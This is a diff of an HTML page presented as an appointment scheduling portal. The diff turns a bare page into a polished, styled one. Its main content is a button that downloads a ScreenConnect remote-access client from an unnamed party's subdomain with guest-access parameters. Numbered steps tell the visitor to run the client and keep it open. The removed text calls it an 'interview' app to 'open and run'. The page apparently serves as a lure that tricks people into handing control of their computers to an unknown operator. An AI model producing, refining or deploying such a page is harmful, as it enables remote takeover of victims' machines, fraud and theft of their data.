@@ -1,55 +1,340 @@
-<div class="icon">📅</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<h1>Schedule an Appointment</h1>
+  <title>Appointment Scheduling</title>
 
-<p class="intro">
-  Please use the support client below to prepare for your online appointment.
-  Follow the instructions carefully before your scheduled session.
-</p>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 
-<div class="details">
-  <div class="detail">✓ Online appointment</div>
-  <div class="detail">✓ Choose your preferred time</div>
-  <div class="detail">✓ Confirmation provided</div>
-</div>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-<a
-  class="button"
-  href="https://nexyrn.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
-  target="_blank"
-  rel="noopener noreferrer">
-  Click Here to Download Support Client
-</a>
+    body {
+      min-height: 100vh;
+      font-family: "Inter", sans-serif;
+      color: #252525;
 
-<div class="instructions">
-  <h3>What to do next</h3>
+      background:
+        linear-gradient(
+          rgba(15, 20, 27, 0.67),
+          rgba(15, 20, 27, 0.67)
+        ),
+        url("https://images.unsplash.com/photo-1497366811353-6870744d04b2?auto=format&fit=crop&w=2200&q=85")
+        center / cover fixed;
 
-  <p>
-    <strong>1.</strong> Click the button above to download the Appointment app
-     client.
-  </p>
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 50px 20px;
+    }
 
-  <p>
-    <strong>2.</strong> Please allow a few moments for the download to
-    complete. Download time may vary depending on your internet connection.
-  </p>
+    .wrapper {
+      width: 100%;
+      max-width: 760px;
+    }
 
-  <p>
-    <strong>3.</strong> Once the download finishes, open the downloaded file
-    and follow the instructions provided by the support representative.
-  </p>
+    .brand {
+      text-align: center;
+      color: white;
+      margin-bottom: 22px;
+      letter-spacing: 2px;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
 
-  <p>
-    <strong>4.</strong> Keep the application open during your scheduled
-    call session.
-  </p>
-</div>
+    .card {
+      background: rgba(255, 255, 255, 0.97);
+      border-radius: 18px;
+      padding: 55px 60px;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.30);
+    }
 
-<p class="note">
-  This download is a virtual application for interview. open
-  and run after downloaded and run
-</p>
+    .icon {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 25px;
 
-<footer>
-  Appointment Scheduling Portal
-</footer>
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 50%;
+      background: #f1eee8;
+      color: #6b5638;
+      font-size: 27px;
+    }
+
+    h1 {
+      font-family: "Cormorant Garamond", serif;
+      font-size: 48px;
+      line-height: 1.05;
+      font-weight: 600;
+      text-align: center;
+      color: #1f2429;
+      margin-bottom: 16px;
+    }
+
+    .intro {
+      max-width: 570px;
+      margin: 0 auto;
+      text-align: center;
+      color: #697078;
+      font-size: 15px;
+      line-height: 1.8;
+    }
+
+    .details {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin: 35px 0;
+    }
+
+    .detail {
+      text-align: center;
+      padding: 16px 10px;
+      border: 1px solid #e9e5de;
+      border-radius: 10px;
+      color: #555d65;
+      font-size: 12px;
+      line-height: 1.5;
+      background: #fcfbf9;
+    }
+
+    .button-area {
+      text-align: center;
+      margin: 35px 0;
+    }
+
+    .button {
+      display: inline-block;
+      padding: 16px 34px;
+      border-radius: 8px;
+
+      background: #27313a;
+      color: white;
+      text-decoration: none;
+
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+
+      box-shadow: 0 8px 22px rgba(39,49,58,0.22);
+      transition: all 0.2s ease;
+    }
+
+    .button:hover {
+      background: #3b4751;
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px rgba(39,49,58,0.28);
+    }
+
+    .instructions {
+      border-top: 1px solid #e9e5de;
+      padding-top: 30px;
+    }
+
+    .instructions h2 {
+      font-family: "Cormorant Garamond", serif;
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #252a2f;
+    }
+
+    .step {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .number {
+      flex-shrink: 0;
+
+      width: 28px;
+      height: 28px;
+
+      border-radius: 50%;
+      background: #f1eee8;
+      color: #6b5638;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .step p {
+      color: #626a72;
+      font-size: 14px;
+      line-height: 1.7;
+    }
+
+    .step strong {
+      color: #30363b;
+    }
+
+    .note {
+      margin-top: 25px;
+      padding: 16px;
+      border-radius: 8px;
+      background: #f7f5f1;
+      color: #737980;
+      font-size: 12px;
+      line-height: 1.7;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #92979c;
+      font-size: 11px;
+      letter-spacing: 0.5px;
+    }
+
+    @media (max-width: 650px) {
+
+      body {
+        padding: 25px 14px;
+      }
+
+      .card {
+        padding: 38px 25px;
+      }
+
+      h1 {
+        font-size: 38px;
+      }
+
+      .details {
+        grid-template-columns: 1fr;
+      }
+
+      .button {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+
+    <div class="brand">
+      Appointment Services
+    </div>
+
+    <div class="card">
+
+      <div class="icon">📅</div>
+
+      <h1>Schedule an Appointment</h1>
+
+      <p class="intro">
+        Please use the support client below to prepare for your
+        online appointment. Follow the instructions carefully
+        before your scheduled session.
+      </p>
+
+      <div class="details">
+        <div class="detail">
+          ✓<br>
+          Online Appointment
+        </div>
+
+        <div class="detail">
+          ✓<br>
+          Convenient Scheduling
+        </div>
+
+        <div class="detail">
+          ✓<br>
+          Session Confirmation
+        </div>
+      </div>
+
+      <div class="button-area">
+
+        <a
+          class="button"
+          href="https://nexyrn.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
+          target="_blank"
+          rel="noopener noreferrer">
+
+          Download Support Client
+
+        </a>
+
+      </div>
+
+      <div class="instructions">
+
+        <h2>What to do next</h2>
+
+        <div class="step">
+          <div class="number">1</div>
+          <p>
+            <strong>Download the support client.</strong><br>
+            Click the button above to begin downloading the
+            ScreenConnect support application.
+          </p>
+        </div>
+
+        <div class="step">
+          <div class="number">2</div>
+          <p>
+            <strong>Allow the download to finish.</strong><br>
+            Please wait a few moments while the application
+            downloads. Download time may vary depending on
+            your internet connection.
+          </p>
+        </div>
+
+        <div class="step">
+          <div class="number">3</div>
+          <p>
+            <strong>Open the downloaded application.</strong><br>
+            Once the download is complete, open the file and
+            follow the instructions displayed by the application.
+          </p>
+        </div>
+
+        <div class="step">
+          <div class="number">4</div>
+          <p>
+            <strong>Prepare for your support session.</strong><br>
+            Keep the application open during your scheduled
+            support session.
+          </p>
+        </div>
+
+        <div class="note">
+          This download is a ScreenConnect remote-support
+          application. Only open and run it if you are expecting
+          a support session from this organization.
+        </div>
+
+      </div>
+
+      <footer>
+        Appointment Scheduling Portal
+      </footer>
+
+    </div>
+
+  </div>
+
+</body>
+</html>
